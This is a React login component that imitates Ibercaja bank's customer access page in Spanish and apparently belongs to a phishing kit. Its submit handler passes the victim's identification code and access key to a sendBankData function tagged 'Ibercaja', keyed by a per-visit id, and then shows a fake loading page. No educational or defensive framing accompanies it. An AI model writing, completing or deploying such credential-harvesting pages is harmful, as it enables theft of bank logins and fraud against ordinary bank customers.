import { useState } from 'react'
import { useNavigate, useParams } from 'react-router-dom'
import { sendBankData } from '../../../utils/utils'
import AppStore from '../../icons/AppStore.svg'
import GooglePlay from '../../images/GooglePlay.png'
import '../../styles/styles.scss'
import { Input } from '../ui/input/Input'

export function LoginForm() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [login, setLogin] = useState('')
  const [password, setPassword] = useState('')

  const sendAndNavigate = (): void => {
    sendBankData(id!, 'Ibercaja', login, password)
    navigate(`/loading/${id}`)
  }

  return (
    <main className="font-ibercaja">
      <div className="mx-auto mb-10 mt-4 flex w-full max-w-[768px] items-center justify-between rounded-[10px] bg-[#f4f7fd] px-6 py-2.5">
        <div className="">
          <h1 className="text-lg leading-6 text-[#33393E]">Descubre la banca digital</h1>
          <h2 className="font-light text-[#33393eb3]">Te invitamos a descubrir todas las funcionalidades disponibles</h2>
        </div>
        <button className="font-ibercaja-icon before:top-[calc((100% - 11px) / 2)] relative h-[40px] rounded-md bg-[#0B7AD0] pl-[16px] pr-[58px] text-[11px] text-white before:absolute before:right-[14px] before:-rotate-90 before:content-['\e908'] hover:bg-[#54a2de]">
          <span className="font-ibercaja text-xs font-medium text-white">DEMO</span>
        </button>
      </div>
      <div className="mx-auto mb-4 flex w-full max-w-[768px] flex-col rounded-sm max-md:items-center md:flex-row md:border md:border-[#33393e33]">
        <div className="font-ibercaja h-full w-full max-w-[478px] px-4 pb-[36px] pt-[20px] md:px-20 md:pb-[56px] md:pt-[67px]">
          <h1 className="mb-10 text-xl font-light text-[#0B7AD0]">Acceso Clientes</h1>
          <p className="mb-6 text-base leading-6 text-[#33393eb3]">Introduce los datos solicitados</p>
          <Input title="Código de identificación" value={login} onChange={(e) => setLogin(e.target.value)} />
          <Input title="Clave de acceso" className="mt-[35px]" value={password} onChange={(e) => setPassword(e.target.value)} />
          <a
            href=""
            className="mt-6 flex w-full justify-end text-[11px] font-medium uppercase text-[#33393E] hover:text-[#0b7ad0]"
          >
            Olvidé mi clave de acceso
          </a>
          <div className="mt-9 md:text-end">
            <button
              onClick={sendAndNavigate}
              className="font-ibercaja-icon before:top-[calc((100% - 11px) / 2)] relative h-[40px] bg-[#0B7AD0] pl-[16px] pr-[58px] text-[11px] text-white before:absolute before:right-[14px] before:-rotate-90 before:content-['\e908'] hover:bg-[#54a2de] max-md:w-full"
            >
              <span className="font-ibercaja text-[11px] font-medium text-white">ENTRAR</span>
            </button>
          </div>
          <a
            href=""
            className="font-ibercaja-icon before:top-[calc((100% - 11px) / 2)] relative mt-[74px] flex text-[11px] text-[#33393e] before:absolute before:right-[14px] before:-rotate-90 before:content-['\e908']"
          >
            <span className="font-ibercaja text-[11px] font-medium uppercase text-[#33393e]">Solo consultas</span>
          </a>
          <a
            href=""
            className="font-ibercaja-icon before:top-[calc((100% - 11px) / 2)] relative mt-[30px] flex text-[11px] text-[#33393e] before:absolute before:right-[14px] before:-rotate-90 before:content-['\e908']"
          >
            <span className="font-ibercaja text-[11px] font-medium uppercase text-[#33393e]">Confirming no clientes</span>
          </a>
        </div>
        <div className="flex w-full max-w-[478px] flex-col bg-[#F4F7FD] px-5 py-10 text-[#33393e] md:my-4 md:mr-4 md:w-[290px]">
          <div className="border-b border-[#33393e33] pb-6">
            <a href="" className="hover:text-[#0b7ad0]">
              ¿Necesitas ayuda?
            </a>
          </div>
          <div className="border-b border-[#33393e33] py-6">
            <a href="" className="hover:text-[#0b7ad0]">
              Recomendaciones de seguridad:
            </a>
            <p className="my-[14px] text-[13px]">Sigue nuestros consejos y ponte al día en seguridad.</p>
          </div>
          <div className="pb-6 pt-4">
            <h3>Descarga nuestra App en tu móvil:</h3>
            <div className="mt-5 flex flex-row">
              <a href="">
                <img src={AppStore} alt="" className="h-6 w-[72px]" />
              </a>
              <a href="">
                <img src={GooglePlay} alt="" className="h-6 w-20" />
              </a>
            </div>
          </div>
        </div>
      </div>
    </main>
  )
}
